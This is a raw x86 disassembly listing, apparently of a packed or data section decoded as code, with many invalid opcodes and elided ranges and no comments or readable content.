  41e0c1:	adc    esp,DWORD PTR [edx]
  41e0c3:	mov    ebp,0xcf2bc464
  41e0c8:	addr16 mov ebp,0x13207754
  41e0ce:	pop    ss
  41e0cf:	mov    ch,0x3b
  41e0d1:	stc    
  41e0d2:	lock push ebx
  41e0d4:	inc    ecx
  41e0d5:	mov    esi,0x8a63b54b
  41e0da:	sbb    DWORD PTR [esi+0x65d78f6d],edi
  41e0e0:	popa   
  41e0e1:	test   DWORD PTR [edx],esi
  41e0e3:	int3   
  41e0e4:	arpl   sp,bx
  41e0e6:	xlat   BYTE PTR ds:[ebx]
  41e0e7:	test   al,0x71
  41e0e9:	add    BYTE PTR [edx-0x47bed675],bh
  41e0ef:	outs   dx,BYTE PTR fs:[esi]
  41e0f1:	je     0x41e0f3
	...
  41e11b:	add    ch,ch
  41e11d:	cmp    DWORD PTR [edx+0x6f],ecx
  41e120:	sub    eax,0xf66c6c61
  41e125:	das    
  41e126:	xor    DWORD PTR [esi],ebp
  41e128:	inc    edi
  41e129:	aas    
  41e12a:	and    eax,0x706e0063
  41e12f:	popa   
  41e130:	jmp    0x41e193
  41e132:	bound  ebp,QWORD PTR [edx+edi*8+0x33]
  41e136:	sbb    eax,0x4182244d
  41e13b:	and    BYTE PTR [edx+0x2f],bh
  41e13e:	sub    eax,0x6598473b
  41e143:	outs   dx,BYTE PTR ds:[esi]
  41e144:	cmp    esi,DWORD PTR [eax+0x73]
  41e147:	jae    0x41e1c0
  41e149:	xor    BYTE PTR ds:0xa436229,dh
  41e14f:	or     ah,BYTE PTR [edi+0x2f]
  41e152:	std    
  41e153:	sub    eax,0x2a5c5971
  41e158:	jno    0x41e17d
  41e15a:	std    
  41e15b:	sub    DWORD PTR [ecx],eax
  41e15d:	and    edi,ebp
  41e15f:	inc    edi
  41e160:	dec    eax
  41e161:	add    BYTE PTR [eax+eax*1+0x1c],0x26
  41e166:	sub    eax,0x222dff38
  41e16b:	xor    BYTE PTR [ebx],bh
  41e16d:	xchg   edi,eax
  41e16e:	sub    DWORD PTR ds:0x2d554b37,esp
  41e174:	cmp    cl,BYTE PTR [edi+0x2f]
  41e177:	pop    eax
  41e178:	cmp    cl,BYTE PTR [edi+0x2f]
  41e17b:	pop    eax
  41e17c:	inc    edx
  41e17d:	and    al,0x2d
  41e17f:	xor    al,BYTE PTR [eax]
	...
  41e1a9:	add    bh,cl
  41e1ab:	and    eax,0x25ff322d
  41e1b0:	sub    eax,0x2d25ff32
  41e1b5:	xor    bh,BYTE PTR [esi]
  41e1b7:	or     bl,dh
  41e1b9:	das    
  41e1ba:	or     al,0xa
  41e1bc:	fisubr WORD PTR [edi]
  41e1be:	or     al,0xfa
  41e1c0:	and    eax,0x2cdf7900
  41e1c5:	dec    esi
  41e1c6:	pop    ds
  41e1c7:	(bad)  
  41e1c8:	sbb    dh,BYTE PTR [esi+0x1b]
  41e1cb:	loope  0x41e1f6
  41e1cd:	jno    0x41e201
  41e1cf:	xchg   edi,eax
  41e1d0:	das    
  41e1d1:	inc    edi
  41e1d2:	adc    BYTE PTR [ecx+esi*1+0x16972500],bl
  41e1d9:	outs   dx,BYTE PTR ds:[esi]
  41e1da:	sbb    eax,DWORD PTR [esi-0x69a7ce2b]
  41e1e0:	xor    BYTE PTR [esi+edi*1-0x75],ch
  41e1e4:	adc    eax,0xda84e955
  41e1e9:	xor    ecx,DWORD PTR [esi]
  41e1eb:	xor    BYTE PTR [ecx],0x61
  41e1ee:	jecxz  0x41e250
  41e1f0:	adc    eax,0x2a550d00
  41e1f5:	je     0x41e1c8
  41e1f7:	push   edx
  41e1f8:	push   ss
  41e1f9:	arpl   dx,si
  41e1fb:	jnp    0x41e220
  41e1fd:	jb     0x41e1e9
  41e1ff:	popa   
  41e200:	xor    BYTE PTR [ebx-0x27],dh
  41e203:	push   0x32
  41e205:	jno    0x41e1a1
  41e207:	je     0x41e241
  41e209:	push   eax
  41e20a:	xchg   edx,eax
  41e20b:	jp     0x41e23e
  41e20d:	jno    0x41e20f
	...
  41e237:	add    BYTE PTR [edx-0x6eaefedf],dh
  41e23d:	sbb    al,0x15
  41e23f:	jne    0x41e1e0
  41e241:	and    BYTE PTR [eax],ch
  41e243:	pop    esp
  41e244:	js     0x41e259
  41e246:	adc    esi,DWORD PTR [edx]
  41e248:	push   0xffffffe2
  41e24a:	sub    al,0x73
  41e24c:	cdq    
  41e24d:	sub    ebp,DWORD PTR [edi]
  41e24f:	jno    0x41e1eb
  41e251:	hlt    
  41e252:	xor    al,0x50
  41e254:	xchg   edx,eax
  41e255:	cli    
  41e256:	xor    DWORD PTR [ecx+0x72],esi
  41e259:	pop    ebx
  41e25a:	call   0x5317:0x85b48f03
  41e261:	mov    edx,0x9d722899
  41e266:	mov    BYTE PTR ds:0x3188961e,dl
  41e26c:	popa   
  41e26d:	mov    esp,0xab1a1584
  41e272:	sbb    DWORD PTR [eax],0x1b
  41e275:	mov    dl,0x7d
  41e277:	push   ss
  41e278:	or     bl,BYTE PTR [ebp-0x6cfdcbc5]
  41e27e:	dec    esi
  41e27f:	pop    ss
  41e280:	adc    cl,al
  41e282:	out    0x36,eax
  41e284:	and    edi,DWORD PTR [ebp-0x3716e4ad]
  41e28a:	dec    esp
  41e28b:	inc    eax
  41e28c:	clc    
  41e28d:	mov    ecx,0xba0f4039
  41e292:	cmp    eax,0x409eda29
  41e297:	and    eax,0x4c0eb3da
	...
  41e2c4:	add    BYTE PTR [eax],al
  41e2c6:	fld    st(7)
  41e2c8:	adc    esi,DWORD PTR [ebx]
  41e2ca:	int3   
  41e2cb:	shl    DWORD PTR [ebx],0x4a
  41e2ce:	jmp    0xe7ce:0xcf331faa
  41e2d5:	sar    DWORD PTR ss:[ebx+esi*8+0xccd991a],cl
  41e2dd:	inc    eax
  41e2de:	js     0x41e29c
  41e2e0:	stc    
  41e2e1:	aad    0x85
  41e2e3:	scas   al,BYTE PTR es:[edi]
  41e2e4:	enter  0x9d19,0xb7
  41e2e8:	mov    ds:0xc6af792c,eax
  41e2ed:	sub    al,BYTE PTR [esi-0x64e8254c]
  41e2f3:	int    0xc0
  41e2f5:	aas    
  41e2f6:	js     0x41e29f
  41e2f8:	xchg   edi,eax
  41e2f9:	dec    ebx
  41e2fa:	imul   ecx,esi,0x0
  41e2fd:	mov    ebp,0xc76dac3d
  41e302:	push   ecx
  41e303:	enter  0x9b5f,0x16
  41e307:	lahf   
  41e308:	inc    esi
  41e309:	mov    BYTE PTR [ebx],dh
  41e30b:	jnp    0x41e358
  41e30d:	mov    BYTE PTR [edi],cl
  41e30f:	mov    ds:0x9f338465,al
  41e314:	push   ecx
  41e315:	mov    BYTE PTR [edi],ah
  41e317:	mov    esi,0xa26aa564
  41e31c:	ins    BYTE PTR es:[edi],dx
  41e31d:	xchg   BYTE PTR [ebx+edx*4+0x67],ah
  41e321:	jp     0x41e374
  41e323:	mov    al,0x72
  41e325:	pusha  
  41e326:	(bad)  
  41e327:	cwde   
  41e328:	push   esp
  41e329:	cmp    DWORD PTR [eax],eax
	...
  41e353:	add    BYTE PTR [edx],cl
  41e355:	mov    al,0x71
  41e357:	pop    ebp
  41e358:	cmp    ch,BYTE PTR [ebx-0x37cca5a1]
  41e35e:	ins    DWORD PTR es:[edi],dx
  41e35f:	cmp    edx,DWORD PTR [esi+0x5b]
  41e362:	dec    eax
  41e363:	dec    esi
  41e364:	push   ebx
  41e365:	(bad)  
  41e366:	dec    esi
  41e367:	dec    eax
  41e368:	and    DWORD PTR [esi-0x41acec00],edi
  41e36e:	jb     0x41e359
  41e370:	icebp  
  41e371:	mov    ecx,0xc842046e
  41e376:	popa   
  41e377:	adc    edi,edi
  41e379:	mov    eax,0xb94c1974
  41e37e:	outs   dx,BYTE PTR ds:[esi]
  41e37f:	adc    BYTE PTR [edx],bh
  41e381:	lahf   
  41e382:	inc    ebp
  41e383:	xor    DWORD PTR [ebp+0x682c4cac],eax
  41e389:	pop    ebx
  41e38a:	inc    edi
  41e38b:	call   DWORD PTR [edx-0x39]
  41e38e:	pop    edi
  41e38f:	aad    0x51
  41e391:	xchg   edi,eax
  41e392:	fstp   TBYTE PTR [di]
  41e395:	cdq    
  41e396:	je     0x41e371
  41e398:	test   BYTE PTR [ecx-0x49a36099],dh
  41e39e:	arpl   WORD PTR [eax],ax
  41e3a0:	pop    ss
  41e3a1:	xchg   DWORD PTR [ebx+0x66],ebp
  41e3a4:	mov    bl,0x62
  41e3a6:	pop    ebp
  41e3a7:	jb     0x41e3ab
  41e3a9:	add    BYTE PTR [ebx+0x68],0xfe
  41e3ad:	data16 ins BYTE PTR es:[edi],dx
  41e3af:	lds    eax,FWORD PTR gs:[ecx+0x79c96953]
  41e3b6:	imul   esi,DWORD PTR [edi+0x0],0x0
	...
  41e3e2:	mov    ah,0x3d
  41e3e4:	inc    eax
  41e3e5:	outs   dx,DWORD PTR ds:[esi]
  41e3e6:	dec    edx
  41e3e7:	jno    0x41e446
  41e3e9:	outs   dx,BYTE PTR ds:[esi]
  41e3ea:	mov    bl,0x78
  41e3ec:	jb     0x41e3ee
  41e3ee:	aam    0x8a
  41e3f0:	data16 je 0x41e423
  41e3f3:	jge    0x41e467
  41e3f5:	gs mov ebx,0x4696892
  41e3fb:	mov    esp,DWORD PTR [ecx+0x72]
  41e3fe:	pop    ebx
  41e3ff:	sub    DWORD PTR [ebx+0x74],0x6
  41e403:	mov    esp,DWORD PTR [eax]
  41e405:	inc    ebx
  41e406:	dec    eax
  41e407:	jb     0x41e472
  41e409:	popa   
  41e40a:	jmp    0x67b44581
  41e40f:	add    DWORD PTR [ebp+0x70],0x74656434
  41e416:	hlt    
  41e417:	outs   dx,BYTE PTR ds:[esi]
  41e418:	add    BYTE PTR [ebx+0x4e],dl
  41e41b:	arpl   WORD PTR [ecx+0x73],sp
  41e41e:	sbb    edx,DWORD PTR [edi+0x5c]
  41e421:	dec    ecx
  41e422:	aaa    
  41e423:	push   0x78336973
  41e428:	push   0x5b88205c
  41e42d:	inc    esi
  41e42e:	push   ebx
  41e42f:	xchg   DWORD PTR [eax],eax
  41e431:	pop    esp
  41e432:	xor    BYTE PTR [esi+0x6e],dh
  41e435:	cs lea esp,ds:[ebp+0x0]
  41e43a:	dec    ecx
  41e43b:	je     0x41e4ab
  41e43d:	imul   esp,DWORD PTR [edi],0x3e5f4f84
  41e443:	lock xor al,0x50
	...
  41e46e:	add    BYTE PTR [eax],al
  41e470:	test   BYTE PTR ds:[ecx+0x52],0x3e
  41e475:	out    dx,al
  41e476:	inc    ebp
  41e477:	inc    esi
  41e478:	or     BYTE PTR [ebx],0x33
  41e47b:	add    BYTE PTR [ebp-0x21],bh
  41e47e:	xor    al,0x43
  41e480:	and    dh,0x30
  41e483:	add    BYTE PTR [edi+0x4d6748f5],cl
  41e489:	out    0x2f,al
  41e48b:	jb     0x41e4e4
  41e48d:	xor    dh,BYTE PTR [ebp*2+0x5f17e660]
  41e494:	dec    esp
  41e495:	iret   
  41e496:	cmp    al,0x45
  41e498:	sub    dl,cl
  41e49a:	and    bl,BYTE PTR [edi+0x22]
  41e49d:	in     eax,0x43
  41e49f:	aas    
  41e4a0:	push   cs
  41e4a1:	idiv   DWORD PTR [ecx+eax*2]
  41e4a4:	sub    ebx,DWORD PTR [esi-0x7e0db9d9]
  41e4aa:	in     al,0x35
  41e4ac:	pop    esi
  41e4ad:	jp     0x41e4dc
  41e4af:	imul   esp,DWORD PTR [ebx],0x6e
  41e4b2:	xor    eax,DWORD PTR [ecx-0x16]
  41e4b5:	test   al,0x2d
  41e4b7:	ins    BYTE PTR es:[edi],dx
  41e4b8:	fcom   QWORD PTR [edx-0x66f2ffee]
  41e4be:	es je  0x41e4b2
  41e4c1:	xchg   edx,eax
  41e4c2:	adc    ah,BYTE PTR [ebx+0x2]
  41e4c5:	jno    0x41e4f7
  41e4c7:	ins    DWORD PTR es:[edi],dx
  41e4c8:	fcom   QWORD PTR [edx+0x30]
  41e4cb:	push   ecx
  41e4cc:	std    
  41e4cd:	jb     0x41e503
  41e4cf:	inc    ebx
  41e4d0:	jmp    0x0:0x741774
	...
  41e4fb:	add    BYTE PTR [eax],al
  41e4fd:	add    bl,bl
  41e4ff:	outs   dx,DWORD PTR ds:[esi]
  41e500:	cmp    BYTE PTR [eax+0x5e],dl
  41e503:	or     cl,ah
  41e505:	dec    edi
  41e506:	lods   al,BYTE PTR ds:[esi]
  41e507:	pop    ecx
  41e508:	arpl   WORD PTR es:[ebp-0x6f92d3bb],bp
  41e50f:	pop    ebx
  41e510:	enter  0x7a2f,0xaa
  41e514:	stos   BYTE PTR es:[edi],al
  41e515:	aaa    
  41e516:	mov    ds:0x6921c3b0,eax
  41e51b:	int    0xe7
  41e51d:	xor    dl,BYTE PTR [ebx-0x66e94447]
  41e523:	int    0xc4
  41e525:	aas    
  41e526:	jnp    0x41e4d7
  41e528:	(bad)  
  41e529:	and    DWORD PTR [ecx+0x21429aaf],ecx
  41e52f:	stos   DWORD PTR es:[edi],eax
  41e530:	lods   al,BYTE PTR ds:[esi]
  41e531:	aas    
  41e532:	jg     0x41e4fa
  41e534:	xchg   ebx,eax
  41e535:	sub    BYTE PTR [eax-0x59],bh
  41e538:	mov    bh,0xe3
  41e53a:	adc    bh,BYTE PTR [ebx-0x61]
  41e53d:	cs push ebp
  41e53f:	mov    dh,0xa3
  41e541:	xor    al,0xff
  41e543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e544:	mov    gs,WORD PTR [esi]
  41e546:	and    bh,BYTE PTR [ebp-0x53c1ee78]
  41e54c:	jle    0x41e573
  41e54e:	sub    cl,al
  41e550:	dec    eax
  41e551:	adc    bl,BYTE PTR ds:0x2330269f
  41e557:	mov    ebp,0x9bef3048
  41e55c:	sub    BYTE PTR [edi*8+0x192a9e],dh
	...
  41e58b:	add    dl,dh
  41e58d:	mov    ch,0x25
  41e58f:	cmp    BYTE PTR [esi],cl
  41e591:	jnp    0x41e591
  41e593:	jecxz  0x41e58e
  41e595:	int3   
  41e596:	ds es (bad) 
  41e59a:	sbb    ch,BYTE PTR ds:0x3008b0eb
  41e5a0:	repnz test eax,0xafdb382a
  41e5a6:	sti    
  41e5a7:	and    ecx,esp
  41e5a9:	int3   
  41e5aa:	out    0x32,eax
  41e5ac:	stos   DWORD PTR es:[edi],eax
  41e5ad:	mov    ch,0xf3
  41e5af:	push   ss
  41e5b0:	xchg   ecx,eax
  41e5b1:	leave  
  41e5b2:	add    BYTE PTR [esi+edi*2],cl
  41e5b5:	cwde   
  41e5b6:	ins    BYTE PTR es:[edi],dx
  41e5b7:	(bad)  
  41e5b8:	pop    edi
  41e5b9:	sahf   
  41e5ba:	ins    BYTE PTR es:[edi],dx
  41e5bb:	mov    edx,0xa4507e7c
  41e5c0:	push   ecx
  41e5c1:	pushf  
  41e5c2:	jae    0x41e5a1
  41e5c4:	push   esi
  41e5c5:	xchg   ebp,eax
  41e5c6:	push   esp
  41e5c7:	mov    ecx,0xb120871d
  41e5cc:	sub    BYTE PTR [edx-0x63d5629d],dh
  41e5d2:	push   esp
  41e5d3:	(bad)  
  41e5d4:	sbb    BYTE PTR [edi+0x5b4fc862],ch
  41e5da:	push   ecx
  41e5db:	xchg   esi,eax
  41e5dc:	and    eax,edi
  41e5de:	jne    0x41e568
  41e5e0:	das    
  41e5e1:	mov    edx,0xb019ae5c
  41e5e6:	bound  ecx,QWORD PTR [eax-0x57be53ef]
  41e5ec:	ins    DWORD PTR es:[edi],dx
  41e5ed:	call   0x0:0xaa5c
	...
  41e618:	add    BYTE PTR [eax],al
  41e61a:	push   esi
  41e61b:	(bad)  
  41e61c:	arpl   WORD PTR [edi-0x4edf548f],bp
  41e622:	popf   
  41e623:	mov    ?,WORD PTR [edx+0x56]
  41e626:	pusha  
  41e627:	mov    edx,0xb0655a71
  41e62c:	outs   dx,BYTE PTR ds:[esi]
  41e62d:	dec    eax
  41e62e:	dec    esi
  41e62f:	lahf   
  41e630:	dec    edi
  41e631:	sub    al,BYTE PTR [esi-0x50]
  41e634:	ins    DWORD PTR es:[edi],dx
  41e635:	push   ebp
  41e636:	sbb    al,0x9e
  41e638:	jb     0x41e623
  41e63a:	xor    DWORD PTR [eax-0x61e3b994],ebx
  41e640:	ins    BYTE PTR es:[edi],dx
  41e641:	sbb    bh,bh
  41e643:	jge    0x41e695
  41e645:	sub    al,0xfe
  41e647:	fwait
  41e648:	jae    0x41e65f
  41e64a:	sbb    DWORD PTR [ebp-0x60bdc6ac],edx
  41e650:	inc    ebp
  41e651:	std    
  41e652:	adc    bh,BYTE PTR [ecx-0x73acffa1]
  41e658:	aas    
  41e659:	inc    ecx
  41e65a:	push   edi
  41e65b:	xchg   esi,eax
  41e65c:	pop    esp
  41e65d:	inc    ebx
  41e65e:	sub    ah,BYTE PTR [esi+0x61]
  41e661:	inc    esi
  41e662:	dec    ebx
  41e663:	xchg   DWORD PTR [eax],esp
  41e665:	push   eax
  41e666:	cmc    
  41e667:	outs   dx,BYTE PTR ds:[esi]
  41e668:	add    BYTE PTR [eax+ebx*8+0x6d],bl
  41e66c:	imul   esp,DWORD PTR [edx-0xa],0x6d
  41e670:	dec    edi
  41e671:	inc    ebx
  41e672:	(bad)  
  41e673:	mov    DWORD PTR [ecx+0x5c],eax
  41e676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e677:	fs je  0x41e6df
  41e67a:	cdq    
  41e67b:	test   DWORD PTR [eax+0x20],edx
	...
  41e6a6:	add    BYTE PTR [eax],al
  41e6a8:	mov    ds:0xd7657470,eax
  41e6ad:	jge    0x41e6ee
  41e6af:	jne    0x41e66c
  41e6b1:	je     0x41e6f9
  41e6b3:	push   esp
  41e6b4:	xchg   edi,eax
  41e6b5:	pop    ecx
  41e6b6:	pop    esp
  41e6b7:	jae    0x41e67b
  41e6b9:	das    
  41e6ba:	popa   
  41e6bb:	popa   
  41e6bc:	stos   DWORD PTR es:[edi],eax
  41e6bd:	pop    ecx
  41e6be:	dec    edi
  41e6bf:	outs   dx,DWORD PTR ds:[esi]
  41e6c0:	leave  
  41e6c1:	gs jae 0x41e725
  41e6c4:	xor    eax,0xc3465c75
  41e6c9:	js     0x41e73a
  41e6cb:	push   0x5c5081d9
  41e6d0:	xor    al,0x57
  41e6d2:	dec    edi
  41e6d3:	outs   dx,DWORD PTR ds:[esi]
  41e6d4:	stc    
  41e6d5:	bound  esi,QWORD PTR [ebx+0x61]
  41e6d8:	in     eax,0x75
  41e6da:	pop    esp
  41e6db:	inc    esi
  41e6dc:	inc    ebx
  41e6dd:	jp     0x41e74e
  41e6df:	push   0x507f29
  41e6e4:	push   esp
  41e6e5:	jo     0x41e74d
  41e6e7:	je     0x41e711
  41e6e9:	jp     0x41e75d
  41e6eb:	xor    edx,DWORD PTR gs:[ebp+0x6f34616c]
  41e6f2:	inc    esi
  41e6f3:	pop    eax
  41e6f4:	pop    ss
  41e6f5:	fwait
  41e6f6:	xor    al,0x0
  41e6f8:	ds jnp 0x41e729
  41e6fb:	jno    0x41e6c7
  41e6fd:	push   edx
  41e6fe:	xor    BYTE PTR [ebx+eiz*4+0x40],ch
  41e702:	inc    ebp
  41e703:	pop    edi
  41e704:	stos   BYTE PTR es:[edi],al
  41e705:	push   0x34
  41e707:	pop    edi
  41e708:	mov    dl,0x5a
  41e70a:	add    al,0x70
	...
  41e734:	add    BYTE PTR [eax],al
  41e736:	lahf   
  41e737:	inc    esi
  41e738:	sub    DWORD PTR [eax],eax
  41e73a:	xchg   DWORD PTR [eax+edx*1],esp
  41e73d:	je     0x41e6de
  41e73f:	push   cs
  41e740:	sub    eax,0x15136e20
  41e745:	push   0x7421f63e
  41e74a:	pop    edi
  41e74b:	in     al,dx
  41e74c:	sub    ebp,DWORD PTR [edx+ebx*2+0x17]
  41e750:	str    WORD PTR [edx+0x5b7429e1]
  41e757:	add    ebx,ebp
  41e759:	arpl   WORD PTR [edi-0x22],bx
  41e75c:	add    BYTE PTR [edi+ebp*2-0x19],bl
  41e760:	sub    DWORD PTR [ecx+0x55],esp
  41e763:	adc    al,0x25
  41e765:	pop    edi
  41e766:	dec    edx
  41e767:	xor    bh,BYTE PTR ds:0x15c12748
  41e76d:	ins    DWORD PTR es:[edi],dx
  41e76e:	sub    al,0xdb
  41e770:	jmp    0xf85c:0x1be1f63
  41e777:	mov    ebp,0x6c267122
  41e77c:	cmp    al,0x50
  41e77e:	repnz pusha 
  41e780:	add    al,0x5c
  41e782:	add    BYTE PTR [esi+0x74167123],dl
  41e788:	cmp    al,0x50
  41e78a:	sbb    bh,BYTE PTR [esi]
  41e78c:	add    DWORD PTR [eax+edi*8-0x56],ebx
  41e790:	sub    BYTE PTR [ebx+0x4],ah
  41e793:	fwait
  41e794:	sub    BYTE PTR [edi+ebx*8+0x31],ch
  41e798:	xor    eax,0x71
	...
  41e7c1:	add    BYTE PTR [eax],al
  41e7c3:	add    bh,ah
  41e7c5:	pop    edx
  41e7c6:	sbb    esp,DWORD PTR [ecx]
  41e7c8:	in     eax,0xb9
  41e7ca:	or     eax,0x19b5e325
  41e7cf:	jmp    0xc99a:0x3fbadc9
  41e7d6:	or     al,0x27
  41e7d8:	popf   
  41e7d9:	lods   eax,DWORD PTR ds:[esi]
  41e7da:	repz push ss
  41e7dc:	popf   
  41e7dd:	leave  
  41e7de:	std    
  41e7df:	and    BYTE PTR [eax+ecx*8-0x505ae443],ch
  41e7e6:	out    0x37,eax
  41e7e8:	cwde   
  41e7e9:	mov    dl,0xcb
  41e7eb:	and    BYTE PTR [edx+esi*4+0x6d6127c3],al
  41e7f2:	iret   
  41e7f3:	sub    BYTE PTR [edx+0x5b],ch
  41e7f6:	call   0x6c24:0xb6c7582a
  41e7fd:	mov    dh,0x93
  41e7ff:	inc    ecx
  41e800:	pop    ecx
  41e801:	scas   eax,DWORD PTR es:[edi]
  41e802:	les    edi,FWORD PTR ds:0x2493af61
  41e808:	ds test al,0x8e
  41e80b:	and    DWORD PTR [edx-0x3c],edx
  41e80e:	mov    BYTE PTR ds:0x2ca59f5d,dl
  41e814:	sub    dh,BYTE PTR [esi-0x50ddd35f]
  41e81a:	mov    bl,ah
  41e81c:	(bad)  
  41e81d:	scas   al,BYTE PTR es:[edi]
  41e81e:	and    BYTE PTR [eax],0x10
  41e821:	(bad)  
  41e822:	out    0x4c,eax
  41e824:	sub    al,cl
  41e826:	pop    ebx
  41e827:	and    eax,0x0
	...
  41e850:	add    BYTE PTR [eax],al
  41e852:	and    ch,BYTE PTR [edi-0x36debfc2]
  41e858:	out    0x4b,eax
  41e85a:	adc    ecx,eax
  41e85c:	push   ebx
  41e85d:	add    al,0xd
  41e85f:	enter  0x164c,0x3e
  41e863:	stos   DWORD PTR es:[edi],eax
  41e864:	dec    eax
  41e865:	pop    ss
  41e866:	out    dx,eax
  41e867:	pop    edx
  41e868:	add    BYTE PTR [ecx],bl
  41e86a:	adc    eax,0x13e974c9
  41e86f:	mov    eax,0xb82e166b
  41e874:	and    BYTE PTR ds:0x3a00c91b,ah
  41e87a:	pop    ds
  41e87b:	leave  
  41e87c:	jbe    0x41e882
  41e87e:	push   eax
  41e87f:	jnp    0x41e8d5
  41e881:	add    BYTE PTR [edx-0x42],cl
  41e884:	add    BYTE PTR [edx],bl
  41e886:	pop    edi
  41e887:	lods   eax,DWORD PTR ds:[esi]
  41e888:	jbe    0x41e896
  41e88a:	dec    eax
  41e88b:	mov    DWORD PTR [eax-0x2],ecx
  41e88e:	xor    BYTE PTR [edi-0x52a14600],ch
  41e894:	jbe    0x41e85a
  41e896:	xor    ecx,DWORD PTR [ecx-0x52a125ad]
  41e89c:	add    BYTE PTR [edx-0x338952e2],bh
  41e8a2:	dec    ebx
  41e8a3:	mov    DWORD PTR [eax-0x38],edx
  41e8a6:	push   eax
  41e8a7:	lods   al,BYTE PTR ds:[esi]
  41e8a8:	add    BYTE PTR [edx-0x3b8952e2],bl
  41e8ae:	xor    ecx,DWORD PTR [ecx-0x50d469b0]
  41e8b4:	add    BYTE PTR [ecx+0x0],bh
	...
  41e8de:	add    BYTE PTR [eax],al
  41e8e0:	and    ch,BYTE PTR [edi-0x41f71698]
  41e8e6:	jb     0x41e87f
  41e8e8:	pop    esi
  41e8e9:	lods   eax,DWORD PTR ds:[esi]
  41e8ea:	push   esp
  41e8eb:	or     BYTE PTR [ebp-0x42],0x0
  41e8ef:	lods   eax,DWORD PTR ds:[esi]
  41e8f0:	bound  ebp,QWORD PTR [esp+esi*2+0x72be68c9]
  41e8f7:	ja     0x41e957
  41e8f9:	lods   eax,DWORD PTR ds:[esi]
  41e8fa:	and    BYTE PTR [ecx],dh
  41e8fc:	lods   al,BYTE PTR ds:[si]
  41e8fe:	je     0x41e8e9
  41e900:	add    DWORD PTR [edx-0x7465a28f],ebx
  41e906:	arpl   WORD PTR [ebx+0x4c],bx
  41e909:	mov    esi,0x8a470072
  41e90e:	outs   dx,DWORD PTR ds:[esi]
  41e90f:	gs and eax,0x24614c5f
  41e915:	dec    ebx
  41e916:	and    BYTE PTR [ebx+0x2],dl
  41e919:	push   ecx
  41e91a:	jbe    0x41e981
  41e91c:	xor    eax,0x24614d3f
  41e921:	push   eax
  41e922:	add    BYTE PTR [esi+esi*1+0x50],cl
  41e926:	je     0x41e948
  41e928:	je     0x41e984
  41e92a:	jb     0x41e9a2
  41e92c:	inc    edx
  41e92d:	push   ecx
  41e92e:	and    BYTE PTR [eax+0x38],dl
  41e931:	push   ecx
  41e932:	je     0x41e934
  41e934:	pop    ebx
  41e935:	jle    0x41e9a6
  41e937:	je     0x41e940
  41e939:	outs   dx,DWORD PTR ds:[esi]
  41e93a:	popa   
  41e93b:	jb     0x41e92e
  41e93d:	pop    eax
  41e93e:	jb     0x41e960
  41e940:	(bad)  
  41e941:	jl     0x41e9b7
  41e943:	push   0x0
	...
  41e96c:	add    BYTE PTR [eax],al
  41e96e:	pop    ss
  41e96f:	mov    ds:0x3e13735d,al
  41e974:	push   eax
  41e975:	gs mov ch,0x4b
  41e978:	popa   
  41e979:	jb     0x41e9b2
  41e97b:	imul   esi,DWORD PTR [ebp+0x70],0xfffffff2
  41e97f:	pop    ebp
  41e980:	inc    esi
  41e981:	push   esp
  41e982:	mov    bh,0x3d
  41e984:	dec    ebx
  41e985:	popa   
  41e986:	mov    cl,0x84
  41e988:	arpl   WORD PTR [ecx-0x4d],sp
  41e98b:	xor    BYTE PTR [edx+0x0],0x91
  41e98f:	mov    DWORD PTR [eax+0x20],edx
  41e992:	in     al,0x82
  41e994:	imul   ebp,DWORD PTR [ebp-0x3a],0x25656483
  41e99b:	pop    esi
  41e99c:	data16 je 0x41e9c6
  41e99f:	and    BYTE PTR [ebp+0x73],0x13
  41e9a3:	inc    esp
  41e9a4:	jno    0x41ea1e
  41e9a6:	repz pop esi
  41e9a8:	pop    esp
  41e9a9:	inc    edx
  41e9aa:	repnz sub BYTE PTR [ebp+eiz*2+0x3e],0x98
  41e9b0:	xor    al,0x72
  41e9b2:	jmp    0xd620c2f
  41e9b7:	xchg   ecx,eax
  41e9b8:	and    dh,BYTE PTR [ecx+esi*8-0x5e]
  41e9bc:	push   ss
  41e9bd:	arpl   WORD PTR [esi],di
  41e9bf:	bound  esp,QWORD PTR [eax]
  41e9c1:	pop    edi
  41e9c2:	rol    BYTE PTR [ebx-0x19],cl
  41e9c5:	popa   
  41e9c6:	into   
  41e9c7:	push   esp
  41e9c8:	add    al,0x51
  41e9ca:	fldenv [ecx+0x10]
  41e9cd:	jne    0x41e9ae
  41e9cf:	push   ebp
  41e9d0:	sbb    eax,0x5c
	...
  41e9f9:	add    BYTE PTR [eax],al
  41e9fb:	add    BYTE PTR [edx+esi*2+0x42],bh
  41e9ff:	push   esp
  41ea00:	mov    ?,WORD PTR [esi+0x46]
  41ea03:	jae    0x41e99f
  41ea05:	sbb    ax,0x5e74
  41ea09:	push   edx
  41ea0a:	push   ss
  41ea0b:	ins    DWORD PTR es:[edi],dx
  41ea0c:	test   eax,0x6a45e460
  41ea11:	repnz xor al,0x4b
  41ea14:	lahf   
  41ea15:	or     esp,DWORD PTR [edi]
  41ea17:	add    BYTE PTR [ebp+0x21],ch
  41ea1a:	pop    ds
  41ea1b:	je     0x41ea8e
  41ea1d:	and    edx,DWORD PTR [ebx]
  41ea1f:	arpl   WORD PTR [edx+0x5a6c0e04],dx
  41ea25:	pop    ds
  41ea26:	or     eax,0x28216c50
  41ea2b:	pushw  ds
  41ea2d:	aad    0x27
  41ea2f:	dec    dx
  41ea31:	fldenv [ecx]
  41ea33:	jb     0x41ea98
  41ea35:	test   BYTE PTR [edx+0x73],0x52
  41ea39:	ficomp WORD PTR ds:0x27d40e74
  41ea3f:	ins    DWORD PTR es:[edi],dx
  41ea40:	sbb    BYTE PTR [edx],ah
  41ea42:	aas    
  41ea43:	push   esp
  41ea44:	push   cs
  41ea45:	and    al,BYTE PTR [esp+ebp*2+0x17]
  41ea49:	out    0x26,eax
  41ea4b:	je     0x41ea47
  41ea4d:	(bad)  
  41ea4e:	and    DWORD PTR [edi+0x20],esp
  41ea51:	pop    ebx
  41ea52:	out    0x32,eax
  41ea54:	sbb    eax,ecx
  41ea56:	push   ebx
  41ea57:	psraw  mm5,QWORD PTR [esp+ecx*2+0x258afc38]
  41ea5f:	xor    BYTE PTR [eax],al
	...
  41ea89:	add    BYTE PTR [esi],cl
  41ea8b:	xchg   edi,eax
  41ea8c:	sub    DWORD PTR [ecx],edx
  41ea8e:	fcmovb st,st(6)
  41ea90:	inc    esp
  41ea91:	adc    BYTE PTR [esi],bl
  41ea93:	mov    edi,DWORD PTR [ecx]
  41ea95:	daa    
  41ea96:	jmp    0x41ea58
  41ea98:	pop    es
